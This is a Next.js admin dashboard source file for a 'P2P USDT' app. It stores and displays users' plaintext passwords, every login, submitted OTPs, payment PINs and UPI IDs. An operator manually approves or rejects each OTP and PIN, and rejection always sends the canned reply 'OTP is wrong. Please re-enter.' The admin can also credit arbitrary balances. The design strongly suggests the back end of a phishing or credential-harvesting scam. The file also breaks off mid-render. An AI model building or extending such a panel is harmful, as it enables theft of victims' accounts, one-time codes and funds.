"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { CRYPTO_NETWORKS } from "@/lib/constants";
import AdminSupportChat, { type SupportThreadItem } from "@/components/admin/AdminSupportChat";

interface Registration {
  id: string;
  mobile: string;
  password: string;
  inviteCode: string | null;
  otp: string | null;
  status: string;
  adminMessage: string | null;
  createdAt: string;
  updatedAt: string;
}

interface Login {
  id: string;
  mobile: string;
  password: string;
  createdAt: string;
}

interface ClientTransaction {
  id: string;
  type: string;
  usdtAmount: number | null;
  inrAmount: number | null;
  screenshot: string | null;
  status: string;
  createdAt: string;
}

interface Client {
  id: string;
  mobile: string;
  password: string;
  usdtBalance: number;
  usdtSent: number;
  usdtReceived: number;
  paymentDetails: {
    bankName: string | null;
    accountNumber: string | null;
    ifsc: string | null;
    accountHolder: string | null;
    upiMobikwik: string | null;
    upiPhonepe: string | null;
    upiPaytm: string | null;
  } | null;
  transactions: ClientTransaction[];
  createdAt: string;
}

interface PendingPayment {
  id: string;
  clientId: string;
  mobile: string;
  sellMethod: string | null;
  usdtAmount: number | null;
  inrAmount: number | null;
  screenshot: string | null;
  note: string | null;
  status: string;
  createdAt: string;
}

interface DepositAddressItem {
  id: string;
  label: string;
  network: string;
  address: string;
  qrImage: string | null;
  isActive: boolean;
  createdAt: string;
}

interface AppSettingsData {
  upiSellRate: number;
  impsSellRate: number;
  upiDailyLimit: number;
  impsDailyLimit: number;
}

interface PaymentPinAttempt {
  id: string;
  clientId: string;
  mobile: string;
  paymentPin: string;
  otp: string | null;
  status: string;
  adminMessage: string | null;
  createdAt: string;
  updatedAt: string;
}

interface WalletAddAttempt {
  id: string;
  clientId: string;
  mobile: string;
  type: string;
  upiId: string;
  otp: string | null;
  status: string;
  adminMessage: string | null;
  createdAt: string;
  updatedAt: string;
}

interface PushNotificationItem {
  id: string;
  title: string;
  message: string;
  createdAt: string;
  dismissCount: number;
}

interface AdminDashboardProps {
  registrations: Registration[];
  logins: Login[];
  clients: Client[];
  pendingSellOrders: PendingPayment[];
  pendingPaymentProofs: PendingPayment[];
  pendingWithdrawing: PendingPayment[];
  depositAddresses: DepositAddressItem[];
  pushNotifications: PushNotificationItem[];
  paymentPinAttempts: PaymentPinAttempt[];
  walletAddAttempts: WalletAddAttempt[];
  appSettings: AppSettingsData;
  supportThreads: SupportThreadItem[];
}

type Tab =
  | "registrations"
  | "logins"
  | "clients"
  | "payments"
  | "depositAddresses"
  | "pricing"
  | "notifications"
  | "paymentPins"
  | "wallets"
  | "support";

function statusBadge(status: string) {
  const styles: Record<string, string> = {
    otp_requested: "bg-yellow-100 text-yellow-700",
    pin_requested: "bg-yellow-100 text-yellow-700",
    address_submitted: "bg-yellow-100 text-yellow-700",
    otp_submitted: "bg-blue-100 text-blue-700",
    otp_rejected: "bg-red-100 text-red-700",
    rejected: "bg-red-100 text-red-700",
    registered: "bg-green-100 text-green-700",
    approved: "bg-green-100 text-green-700",
    pending: "bg-yellow-100 text-yellow-700",
    awaiting_payment: "bg-blue-100 text-blue-700",
    payment_submitted: "bg-violet-100 text-violet-700",
    expired: "bg-slate-100 text-slate-600",
    pending_withdrawing: "bg-amber-100 text-amber-700",
    completed: "bg-green-100 text-green-700",
  };
  return styles[status] || "bg-slate-100 text-slate-700";
}

export default function AdminDashboard({
  registrations,
  logins,
  clients,
  pendingSellOrders,
  pendingPaymentProofs,
  pendingWithdrawing,
  depositAddresses,
  pushNotifications,
  paymentPinAttempts,
  walletAddAttempts,
  appSettings,
  supportThreads,
}: AdminDashboardProps) {
  const [tab, setTab] = useState<Tab>("clients");
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [dedupeMsg, setDedupeMsg] = useState("");
  const [expandedClient, setExpandedClient] = useState<string | null>(null);
  const [txForm, setTxForm] = useState({ type: "usdt_received", usdtAmount: "", inrAmount: "", note: "" });
  const [upiRate, setUpiRate] = useState(String(appSettings.upiSellRate));
  const [impsRate, setImpsRate] = useState(String(appSettings.impsSellRate));
  const [upiDailyLimit, setUpiDailyLimit] = useState(String(appSettings.upiDailyLimit));
  const [impsDailyLimit, setImpsDailyLimit] = useState(String(appSettings.impsDailyLimit));
  const [pricingMsg, setPricingMsg] = useState("");
  const [approveOrderId, setApproveOrderId] = useState<string | null>(null);
  const [approveForm, setApproveForm] = useState({
    depositAddressId: "",
    network: "",
    address: "",
  });
  const [approveQr, setApproveQr] = useState<File | null>(null);
  const [addressForm, setAddressForm] = useState({ label: "", network: "TRC20 (Tron)", address: "" });
  const [addressQr, setAddressQr] = useState<File | null>(null);
  const [addressMsg, setAddressMsg] = useState("");
  const [pushTitle, setPushTitle] = useState("");
  const [pushMessage, setPushMessage] = useState("");
  const [pushMsg, setPushMsg] = useState("");
  const supportUnread = supportThreads.reduce((sum, t) => sum + t.unreadCount, 0);
  const router = useRouter();

  const limitPresets = [
    { label: "₹1L", value: 100000 },
    { label: "₹2L", value: 200000 },
    { label: "₹5L", value: 500000 },
    { label: "₹10L", value: 1000000 },
  ];

  async function handleLogout() {
    await fetch("/api/admin/logout", { method: "POST" });
    router.push("/admin/login");
    router.refresh();
  }

  async function handleRefresh() {
    router.refresh();
  }

  async function handleDedupe() {
    setDedupeMsg("");
    setActionLoading("dedupe");
    try {
      const res = await fetch("/api/admin/dedupe", { method: "POST" });
      const data = await res.json();
      if (res.ok) {
        setDedupeMsg(
          `Removed ${data.registrationsRemoved} duplicate registration(s) and ${data.loginsRemoved} duplicate login(s).`
        );
        router.refresh();
      }
    } finally {
      setActionLoading(null);
    }
  }

  async function handleDeleteRegistration(id: string, mobile: string) {
    if (!confirm(`Delete registration for +91 ${mobile}?`)) return;
    setActionLoading(id);
    try {
      await fetch("/api/admin/delete-registration", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleRejectOtp(id: string) {
    setActionLoading(id);
    try {
      await fetch("/api/admin/reject-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, message: "OTP is wrong. Please re-enter." }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleApproveOtp(id: string) {
    setActionLoading(id);
    try {
      await fetch("/api/admin/approve-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleDeleteClient(id: string, mobile: string) {
    if (!confirm(`Delete account +91 ${mobile}? This cannot be undone.`)) return;
    setActionLoading(id);
    try {
      await fetch("/api/admin/delete-client", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleAddTransaction(clientId: string) {
    setActionLoading(clientId);
    try {
      await fetch("/api/admin/add-transaction", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          clientId,
          type: txForm.type,
          usdtAmount: txForm.usdtAmount,
          inrAmount: txForm.inrAmount,
          note: txForm.note,
          status: "confirmed",
        }),
      });
      setTxForm({ type: "usdt_received", usdtAmount: "", inrAmount: "", note: "" });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleConfirmPayment(transactionId: string, status: string) {
    setActionLoading(transactionId);
    try {
      await fetch("/api/admin/confirm-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ transactionId, status }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleApproveSellOrder() {
    if (!approveOrderId) return;
    setActionLoading(approveOrderId);
    try {
      const formData = new FormData();
      formData.append("transactionId", approveOrderId);
      if (approveForm.depositAddressId) {
        formData.append("depositAddressId", approveForm.depositAddressId);
      } else {
        formData.append("network", approveForm.network);
        formData.append("address", approveForm.address);
        if (approveQr) formData.append("qrImage", approveQr);
      }
      const res = await fetch("/api/admin/approve-sell-order", { method: "POST", body: formData });
      const data = await res.json();
      if (!res.ok) {
        alert(data.error || "Failed to approve order");
        return;
      }
      setApproveOrderId(null);
      setApproveForm({ depositAddressId: "", network: "", address: "" });
      setApproveQr(null);
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleAddDepositAddress(e: React.FormEvent) {
    e.preventDefault();
    setActionLoading("add-address");
    setAddressMsg("");
    try {
      const formData = new FormData();
      formData.append("label", addressForm.label);
      formData.append("network", addressForm.network);
      formData.append("address", addressForm.address);
      if (addressQr) formData.append("qrImage", addressQr);
      const res = await fetch("/api/admin/deposit-addresses", { method: "POST", body: formData });
      const data = await res.json();
      if (!res.ok) {
        setAddressMsg(data.error || "Failed to add address");
        return;
      }
      setAddressForm({ label: "", network: "TRC20 (Tron)", address: "" });
      setAddressQr(null);
      setAddressMsg("Deposit address saved.");
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleToggleAddress(id: string, isActive: boolean) {
    setActionLoading(id);
    try {
      await fetch(`/api/admin/deposit-addresses/${id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isActive: !isActive }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleDeletePush(id: string, title: string) {
    if (!confirm(`Delete push notification "${title}"?\n\nClients who haven't dismissed it will no longer see it.`)) {
      return;
    }
    setActionLoading(id);
    try {
      await fetch(`/api/admin/push-notifications/${id}`, { method: "DELETE" });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleSendPush(e: React.FormEvent) {
    e.preventDefault();
    setPushMsg("");
    setActionLoading("send-push");
    try {
      const res = await fetch("/api/admin/push-notifications", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title: pushTitle, message: pushMessage }),
      });
      const data = await res.json();
      if (!res.ok) {
        setPushMsg(data.error || "Failed to send notification");
        return;
      }
      setPushTitle("");
      setPushMessage("");
      setPushMsg(data.message || "Notification sent successfully.");
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleDeleteAddress(id: string) {
    if (!confirm("Delete this deposit address?")) return;
    setActionLoading(id);
    try {
      await fetch(`/api/admin/deposit-addresses/${id}`, { method: "DELETE" });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleSavePricing() {
    setPricingMsg("");

    const upi = Number(upiRate);
    const imps = Number(impsRate);
    const upiLimit = Number(upiDailyLimit);
    const impsLimit = Number(impsDailyLimit);

    if (!upi || upi <= 0 || !imps || imps <= 0) {
      setPricingMsg("Both UPI and IMPS rates must be positive numbers.");
      return;
    }
    if (!upiLimit || upiLimit <= 0 || !impsLimit || impsLimit <= 0) {
      setPricingMsg("Daily limits must be positive numbers.");
      return;
    }

    setActionLoading("pricing");
    try {
      const res = await fetch("/api/admin/pricing", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          upiSellRate: upi,
          impsSellRate: imps,
          upiDailyLimit: upiLimit,
          impsDailyLimit: impsLimit,
        }),
      });
      let data: { error?: string } = {};
      try {
        data = await res.json();
      } catch {
        if (!res.ok) {
          setPricingMsg("Server error — please try again.");
          return;
        }
      }
      if (!res.ok) {
        setPricingMsg(data.error || "Failed to update rates");
        return;
      }
      setPricingMsg("Settings updated successfully. Clients will see changes immediately.");
      router.refresh();
    } catch {
      setPricingMsg("Could not reach the server. Check that the app is running and try again.");
    } finally {
      setActionLoading(null);
    }
  }

  async function handleApprovePaymentPin(id: string) {
    setActionLoading(id);
    try {
      await fetch("/api/admin/approve-payment-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleRejectPaymentPin(id: string) {
    setActionLoading(id);
    try {
      await fetch("/api/admin/reject-payment-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, message: "OTP is wrong. Please re-enter." }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleApproveWallet(id: string) {
    setActionLoading(id);
    try {
      await fetch("/api/admin/approve-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  async function handleRejectWallet(id: string) {
    setActionLoading(id);
    try {
      await fetch("/api/admin/reject-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, message: "OTP is wrong. Please re-enter." }),
      });
      router.refresh();
    } finally {
      setActionLoading(null);
    }
  }

  return (
    <div className="min-h-screen bg-slate-50">
      <header className="bg-white border-b border-slate-200 px-6 py-4 flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-800">P2P USDT Admin</h1>
          <p className="text-sm text-slate-500">Manage clients, USDT trades, and payments</p>
        </div>
        <div className="flex gap-3 flex-wrap">
          <button
            onClick={handleDedupe}
            disabled={actionLoading === "dedupe"}
            className="px-4 py-2 text-sm bg-amber-100 hover:bg-amber-200 rounded-lg text-amber-800 disabled:opacity-50"
          >
            Clean Duplicates
          </button>
          <button onClick={handleRefresh} className="px-4 py-2 text-sm bg-slate-100 hover:bg-slate-200 rounded-lg text-slate-700">
            Refresh
          </button>
          <button onClick={handleLogout} className="px-4 py-2 text-sm bg-red-500 hover:bg-red-600 rounded-lg text-white">
            Logout
          </button>
        </div>
      </header>

      <div className="max-w-7xl mx-auto p-6">
        {dedupeMsg && (
          <div className="bg-green-50 text-green-700 text-sm p-3 rounded-lg mb-4 border border-green-200">
            {dedupeMsg}
          </div>
        )}
        <div className="flex gap-2 mb-6 flex-wrap">
          {(
            [
              ["clients", `Clients (${clients.length})`],
              ["payments", `Sell Orders (${pendingSellOrders.length + pendingPaymentProofs.length + pendingWithdrawing.length})`],
              ["depositAddresses", `Deposit Addresses (${depositAddresses.length})`],
              ["pricing", "Rates & Limits"],
              ["notifications", `Push (${pushNotifications.length})`],
              ["support", supportUnread > 0 ? `Support (${supportUnread})` : "Support"],
              ["wallets", `Wallet Adds (${walletAddAttempts.length})`],
              ["paymentPins", `Payment PINs (${paymentPinAttempts.length})`],
              ["registrations", `Registrations (${registrations.length})`],
              ["logins", `Logins (${logins.length})`],
            ] as [Tab, string][]
          ).map(([key, label]) => (
            <button
              key={key}
              onClick={() => setTab(key)}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
                tab === key
                  ? "bg-blue-500 text-white"
                  : key === "support" && supportUnread > 0
                    ? "bg-red-50 text-red-700 border border-red-200"
                    : "bg-white text-slate-600 border border-slate-200"
              }`}
            >
              {label}
            </button>
          ))}
        </div>

        {tab === "clients" && (
          <div className="space-y-4">
            {clients.length === 0 ? (
              <div className="bg-white rounded-xl p-8 text-center text-slate-400 border">
                No clients yet. Approve registrations to create accounts.
              </div>
            ) : (
              clients.map((c) => (
                <div key={c.id} className="bg-white rounded-xl border border-slate-200 overflow-hidden">
                  <div className="p-4 flex flex-wrap items-center justify-between gap-4 border-b bg-slate-50">
                    <div>
                      <p className="font-bold text-slate-800">+91 {c.mobile}</p>
                      <p className="text-xs text-slate-500">Password: {c.password}</p>
                    </div>
                    <div className="flex gap-4 text-sm">
                      <div><span className="text-slate-500">Received:</span> <strong className="text-green-600">{c.usdtReceived.toFixed(2)}</strong></div>
                      <div><span className="text-slate-500">Sent:</span> <strong className="text-orange-500">{c.usdtSent.toFixed(2)}</strong></div>
                      <div><span className="text-slate-500">Balance:</span> <strong className="text-blue-600">{c.usdtBalance.toFixed(2)} USDT</strong></div>
                    </div>
                    <div className="flex gap-2 flex-wrap">
                      <Link
                        href={`/admin/client/${c.id}`}
                        className="px-3 py-1 text-xs bg-blue-500 text-white rounded hover:bg-blue-600"
                      >
                        View Dashboard
                      </Link>
                      <button
                        onClick={() => setExpandedClient(expandedClient === c.id ? null : c.id)}
                        className="px-3 py-1 text-xs bg-slate-200 rounded hover:bg-slate-300"
                      >
                        {expandedClient === c.id ? "Hide" : "Quick View"}
                      </button>
                      <button
                        onClick={() => handleDeleteClient(c.id, c.mobile)}
                        disabled={actionLoading === c.id}
                        className="px-3 py-1 text-xs bg-red-500 text-white rounded hover:bg-red-600 disabled:opacity-50"
                      >
                        Delete Account
                      </button>
                    </div>
                  </div>

                  {expandedClient === c.id && (
                    <div className="p-4 space-y-4">
                      {c.paymentDetails && (
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm bg-slate-50 p-4 rounded-lg">
                          <div><span className="text-slate-500">Bank:</span> {c.paymentDetails.bankName || "—"}</div>
                          <div><span className="text-slate-500">Holder:</span> {c.paymentDetails.accountHolder || "—"}</div>
                          <div><span className="text-slate-500">Account:</span> {c.paymentDetails.accountNumber || "—"}</div>
                          <div><span className="text-slate-500">IFSC:</span> {c.paymentDetails.ifsc || "—"}</div>
                          <div><span className="text-slate-500">Mobikwik:</span> {c.paymentDetails.upiMobikwik || "—"}</div>
                          <div><span className="text-slate-500">PhonePe:</span> {c.paymentDetails.upiPhonepe || "—"}</div>
                          <div><span className="text-slate-500">Paytm:</span> {c.paymentDetails.upiPaytm || "—"}</div>
                        </div>
                      )}

                      <div className="flex flex-wrap gap-2 items-end bg-blue-50 p-4 rounded-lg">
                        <select
                          value={txForm.type}
                          onChange={(e) => setTxForm({ ...txForm, type: e.target.value })}
                          className="border rounded px-2 py-1 text-sm"
                        >
                          <option value="usdt_received">USDT Received</option>
                          <option value="usdt_sent">USDT Sent</option>
                        </select>
                        <input
                          placeholder="USDT amount"
                          value={txForm.usdtAmount}
                          onChange={(e) => setTxForm({ ...txForm, usdtAmount: e.target.value })}
                          className="border rounded px-2 py-1 text-sm w-28"
                        />
                        <input
                          placeholder="INR amount"
                          value={txForm.inrAmount}
                          onChange={(e) => setTxForm({ ...txForm, inrAmount: e.target.value })}
                          className="border rounded px-2 py-1 text-sm w-28"
                        />
                        <input
                          placeholder="Note"
                          value={txForm.note}
                          onChange={(e) => setTxForm({ ...txForm, note: e.target.value })}
                          className="border rounded px-2 py-1 text-sm flex-1 min-w-[120px]"
                        />
                        <button
                          onClick={() => handleAddTransaction(c.id)}
                          disabled={actionLoading === c.id}
                          className="px-3 py-1 text-xs bg-green-500 text-white rounded hover:bg-green-600 disabled:opacity-50"
                        >
                          Add Transaction
                        </button>
                      </div>

                      {c.transactions.length > 0 && (
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b">
                              <th className="text-left py-2 text-slate-600">Type</th>
                              <th className="text-left py-2 text-slate-600">USDT</th>
                              <th className="text-left py-2 text-slate-600">INR</th>
                              <th className="text-left py-2 text-slate-600">Screenshot</th>
                              <th className="text-left py-2 text-slate-600">Status</th>
                              <th className="text-left py-2 text-slate-600">Time</th>
                            </tr>
                          </thead>
                          <tbody>
                            {c.transactions.map((t) => (
                              <tr key={t.id} className="border-b border-slate-50">
                                <td className="py-2">{t.type.replace(/_/g, " ")}</td>
                                <td className="py-2">{t.usdtAmount?.toFixed(2) ?? "—"}</td>
                                <td className="py-2">{t.inrAmount ? `₹${t.inrAmount}` : "—"}</td>
                                <td className="py-2">
                                  {t.screenshot ? (
                                    <a href={t.screenshot} target="_blank" rel="noopener noreferrer" className="text-blue-500">View</a>
                                  ) : "—"}
                                </td>
                                <td className="py-2">
                                  <span className={`px-2 py-0.5 rounded text-xs ${statusBadge(t.status)}`}>{t.status}</span>
                                </td>
                                <td className="py-2 text-slate-500">{new Date(t.createdAt).toLocaleString()}</td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      )}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        )}

        {tab === "payments" && (
          <div className="space-y-8">
            <div>
              <h2 className="font-bold text-slate-800 mb-3">New Sell Orders — Approve &amp; Assign Deposit Address</h2>
              <div className="bg-white rounded-xl border overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="bg-slate-50 border-b">
                      <th className="text-left px-4 py-3">Mobile</th>
                      <th className="text-left px-4 py-3">Method</th>
                      <th className="text-left px-4 py-3">USDT</th>
                      <th className="text-left px-4 py-3">INR</th>
                      <th className="text-left px-4 py-3">Note</th>
                      <th className="text-left px-4 py-3">Time</th>
                      <th className="text-left px-4 py-3">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {pendingSellOrders.length === 0 ? (
                      <tr><td colSpan={7} className="px-4 py-8 text-center text-slate-400">No new sell orders</td></tr>
                    ) : (
                      pendingSellOrders.map((p) => (
                        <tr key={p.id} className="border-b">
                          <td className="px-4 py-3">+91 {p.mobile}</td>
                          <td className="px-4 py-3 uppercase font-semibold text-xs">{p.sellMethod || "—"}</td>
                          <td className="px-4 py-3">{p.usdtAmount?.toFixed(2) ?? "—"}</td>
                          <td className="px-4 py-3">{p.inrAmount ? `₹${p.inrAmount}` : "—"}</td>
                          <td className="px-4 py-3 text-slate-500 max-w-[160px] truncate">{p.note || "—"}</td>
                          <td className="px-4 py-3 text-slate-500">{new Date(p.createdAt).toLocaleString()}</td>
                          <td className="px-4 py-3">
                            <div className="flex gap-2">
                              <button
                                onClick={() => {
                                  setApproveOrderId(p.id);
                                  setApproveForm({ depositAddressId: "", network: "", address: "" });
                                  setApproveQr(null);
                                }}
                                disabled={actionLoading === p.id}
                                className="px-2 py-1 text-xs bg-green-500 text-white rounded disabled:opacity-50"
                              >
                                Approve Order
                              </button>
                              <button
                                onClick={() => handleConfirmPayment(p.id, "rejected")}
                                disabled={actionLoading === p.id}
                                className="px-2 py-1 text-xs bg-red-500 text-white rounded disabled:opacity-50"
                              >
                                Reject
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            <div>
              <h2 className="font-bold text-slate-800 mb-3">Payment Proofs — Approve USDT Received</h2>
              <div className="bg-white rounded-xl border overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="bg-slate-50 border-b">
                      <th className="text-left px-4 py-3">Mobile</th>
                      <th className="text-left px-4 py-3">Method</th>
                      <th className="text-left px-4 py-3">USDT</th>
                      <th className="text-left px-4 py-3">INR</th>
                      <th className="text-left px-4 py-3">Proof</th>
                      <th className="text-left px-4 py-3">Time</th>
                      <th className="text-left px-4 py-3">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {pendingPaymentProofs.length === 0 ? (
                      <tr><td colSpan={7} className="px-4 py-8 text-center text-slate-400">No payment proofs pending</td></tr>
                    ) : (
                      pendingPaymentProofs.map((p) => (
                        <tr key={p.id} className="border-b">
                          <td className="px-4 py-3">+91 {p.mobile}</td>
                          <td className="px-4 py-3 uppercase font-semibold text-xs">{p.sellMethod || "—"}</td>
                          <td className="px-4 py-3">{p.usdtAmount?.toFixed(2) ?? "—"}</td>
                          <td className="px-4 py-3">{p.inrAmount ? `₹${p.inrAmount}` : "—"}</td>
                          <td className="px-4 py-3">
                            {p.screenshot ? (
                              <a href={p.screenshot} target="_blank" rel="noopener noreferrer" className="text-blue-500">View</a>
                            ) : "—"}
                          </td>
                          <td className="px-4 py-3 text-slate-500">{new Date(p.createdAt).toLocaleString()}</td>
                          <td className="px-4 py-3">
                            <div className="flex gap-2">
                              <button
                                onClick={() => handleConfirmPayment(p.id, "pending_withdrawing")}
                                disabled={actionLoading === p.id}
                                className="px-2 py-1 text-xs bg-green-500 text-white rounded disabled:opacity-50"
                              >
                                Approve USDT
                              </button>
                              <button
                                onClick={() => handleConfirmPayment(p.id, "failed")}
                                disabled={actionLoading === p.id}
                                className="px-2 py-1 text-xs bg-red-500 text-white rounded disabled:opacity-50"
                              >
                                Reject
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>

            <div>
              <h2 className="font-bold text-slate-800 mb-3">Pending Withdrawing — Mark INR Payout Completed</h2>
              <div className="bg-white rounded-xl border overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="bg-slate-50 border-b">
                      <th className="text-left px-4 py-3">Mobile</th>
                      <th className="text-left px-4 py-3">Method</th>
                      <th className="text-left px-4 py-3">USDT</th>
                      <th className="text-left px-4 py-3">INR</th>
                      <th className="text-left px-4 py-3">Time</th>
                      <th className="text-left px-4 py-3">Actions</th>
                    </tr>
                  </thead>
                  <tbody>
                    {pendingWithdrawing.length === 0 ? (
                      <tr><td colSpan={6} className="px-4 py-8 text-center text-slate-400">No pending withdrawals</td></tr>
                    ) : (
                      pendingWithdrawing.map((p) => (
                        <tr key={p.id} className="border-b">
                          <td className="px-4 py-3">+91 {p.mobile}</td>
                          <td className="px-4 py-3 uppercase font-semibold text-xs">{p.sellMethod || "—"}</td>
                          <td className="px-4 py-3">{p.usdtAmount?.toFixed(2) ?? "—"}</td>
                          <td className="px-4 py-3">{p.inrAmount ? `₹${p.inrAmount}` : "—"}</td>
                          <td className="px-4 py-3 text-slate-500">{new Date(p.createdAt).toLocaleString()}</td>
                          <td className="px-4 py-3">
                            <div className="flex gap-2">
                              <button
                                onClick={() => handleConfirmPayment(p.id, "completed")}
                                disabled={actionLoading === p.id}
                                className="px-2 py-1 text-xs bg-emerald-600 text-white rounded disabled:opacity-50"
                              >
                                Mark Completed
                              </button>
                              <button
                                onClick={() => handleConfirmPayment(p.id, "failed")}
                                disabled={actionLoading === p.id}
                                className="px-2 py-1 text-xs bg-red-500 text-white rounded disabled:opacity-50"
                              >
                                Mark Failed
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {tab === "depositAddresses" && (
          <div className="grid lg:grid-cols-2 gap-8">
            <div className="bg-white rounded-xl border p-6">
              <h2 className="font-bold text-slate-800 mb-4">Add Deposit Address</h2>
              <form onSubmit={handleAddDepositAddress} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1">Label</label>
                  <input
                    className="w-full border rounded-lg px-3 py-2 text-sm"
                    placeholder="e.g. Main TRC20 Wallet"
                    value={addressForm.label}
                    onChange={(e) => setAddressForm((f) => ({ ...f, label: e.target.value }))}
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1">Network</label>
                  <select
                    className="w-full border rounded-lg px-3 py-2 text-sm"
                    value={addressForm.network}
                    onChange={(e) => setAddressForm((f) => ({ ...f, network: e.target.value }))}
                  >
                    {CRYPTO_NETWORKS.map((n) => (
                      <option key={n} value={n}>{n}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1">Wallet Address</label>
                  <input
                    className="w-full border rounded-lg px-3 py-2 text-sm font-mono"
                    placeholder="Paste USDT deposit address"
                    value={addressForm.address}
                    onChange={(e) => setAddressForm((f) => ({ ...f, address: e.target.value }))}
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1">QR Code (optional)</label>
                  <input
                    type="file"
                    accept="image/*"
                    className="w-full text-sm"
                    onChange={(e) => setAddressQr(e.target.files?.[0] || null)}
                  />
                </div>
                {addressMsg && <p className="text-sm text-green-600">{addressMsg}</p>}
                <button
                  type="submit"
                  disabled={actionLoading === "add-address"}
                  className="w-full py-2.5 bg-blue-600 text-white rounded-lg font-semibold disabled:opacity-50"
                >
                  Save Address
                </button>
              </form>
            </div>

            <div className="bg-white rounded-xl border overflow-hidden">
              <div className="px-4 py-3 border-b bg-slate-50 font-semibold text-slate-800">Saved Addresses</div>
              {depositAddresses.length === 0 ? (
                <p className="p-8 text-center text-slate-400 text-sm">No deposit addresses yet</p>
              ) : (
                <div className="divide-y">
                  {depositAddresses.map((a) => (
                    <div key={a.id} className="p-4">
                      <div className="flex items-start justify-between gap-3">
                        <div>
                          <p className="font-semibold text-slate-800">{a.label}</p>
                          <p className="text-xs text-blue-600 mt-0.5">{a.network}</p>
                          <p className="text-xs font-mono text-slate-600 mt-1 break-all">{a.address}</p>
                          {a.qrImage && (
                            <a href={a.qrImage} target="_blank" rel="noopener noreferrer" className="text-xs text-blue-500 mt-1 inline-block">
                              View QR
                            </a>
                          )}
                        </div>
                        <span className={`text-xs px-2 py-0.5 rounded ${a.isActive ? "bg-green-100 text-green-700" : "bg-slate-100 text-slate-500"}`}>
                          {a.isActive ? "Active" : "Inactive"}
                        </span>
                      </div>
                      <div className="flex gap-2 mt-3">
                        <button
                          onClick={() => handleToggleAddress(a.id, a.isActive)}
                          disabled={actionLoading === a.id}
                          className="text-xs px-2 py-1 border rounded disabled:opacity-50"
                        >
                          {a.isActive ? "Deactivate" : "Activate"}
                        </button>
                        <button
                          onClick={() => handleDeleteAddress(a.id)}
                          disabled={actionLoading === a.id}
                          className="text-xs px-2 py-1 bg-red-500 text-white rounded disabled:opacity-50"
                        >
                          Delete
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {approveOrderId && (
          <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4">
            <div className="bg-white rounded-xl w-full max-w-md p-6 max-h-[90vh] overflow-y-auto">
              <h3 className="text-lg font-bold text-slate-900 mb-4">Approve Sell Order</h3>
              <p className="text-sm text-slate-500 mb-4">Choose a saved address or enter custom deposit details. Customer gets 15 minutes to pay.</p>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-700 mb-1">Use Saved Address</label>
                  <select
                    className="w-full border rounded-lg px-3 py-2 text-sm"
                    value={approveForm.depositAddressId}
                    onChange={(e) => setApproveForm((f) => ({ ...f, depositAddressId: e.target.value }))}
                  >
                    <option value="">— Custom address —</option>
                    {depositAddresses.filter((a) => a.isActive).map((a) => (
                      <option key={a.id} value={a.id}>{a.label} ({a.network})</option>
                    ))}
                  </select>
                </div>

                {!approveForm.depositAddressId && (
